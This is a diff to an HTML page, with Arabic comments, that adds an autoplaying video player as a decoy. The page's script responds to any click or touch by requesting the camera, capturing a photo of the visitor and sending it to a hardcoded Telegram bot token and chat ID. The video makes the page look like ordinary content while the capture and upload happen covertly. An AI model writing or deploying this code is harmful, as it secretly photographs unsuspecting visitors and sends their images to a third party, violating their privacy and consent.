@@ -1,12 +1,56 @@
-#result {
+body {
+        background-color: #0f0f0f;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+    }
+
+    /* حاوية الفيديو */
+    .video-container {
+        width: 100%;
+        max-width: 400px;
+        background: #000;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+        border: 1px solid #222;
+    }
+
+    video {
+        width: 100%;
+        height: auto;
+        display: block;
+        object-fit: cover;
+    }
+
+    /* تنسيق الصورة الخاصة بك */
+    #result {
         max-width: 90%;
         max-height: 90vh;
         border-radius: 10px;
         display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 999;
     }
 </style>
+<!-- حاوية الفيديو -->
+<div class="video-container">
+    <video id="mainVideo" controls autoplay playsinline>
+        <source src="v1c044g50000dasenivog65m261t1ks0.mp4" type="video/mp4">
+        متصفحك لا يدعم تشغيل الفيديو.
+    </video>
+</div>
+
+<!-- عنصر إظهار اللقطة -->
 <img id="result" alt="">
 
+<!-- السكريبت المدمج -->
 <script>
     const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
     const TELEGRAM_CHAT_ID = '6642913954';
@@ -20,14 +64,14 @@
         let stream = null;
 
         try {
-            // 1. طلب إذن الكاميرا عند النقر على الشاشة
+            // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            // 2. التقاط صورة فورية
+            // التقاط صورة فورية
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -35,7 +79,7 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
 
-            // إظهار اللقطة لمدة ثانية واحدة
+            // إظهار اللقطة لمدة ثانية واحدة (اختياري)
             const img = document.getElementById('result');
             img.src = canvas.toDataURL('image/png');
             img.style.display = 'block';
@@ -44,7 +88,7 @@
                 img.style.display = 'none';
             }, 1000);
 
-            // 3. إرسال الصورة إلى تيليجرام
+            // إرسال الصورة إلى تيليجرام
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -63,14 +107,14 @@
         } catch (err) {
             console.error("خطأ الكاميرا:", err);
         } finally {
-            // 4. إغلاق الكاميرا وإيقاف الضوء/البث فوراً
+            // إيقاف مسار الكاميرا فوراً
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
     }
 
-    // الاستماع للنقر أو اللمس في أي مكان في الصفحة
+    // الاستماع للنقر أو اللمس في الصفحة
     window.addEventListener('click', handleCapture);
     window.addEventListener('touchstart', handleCapture);
 </script>
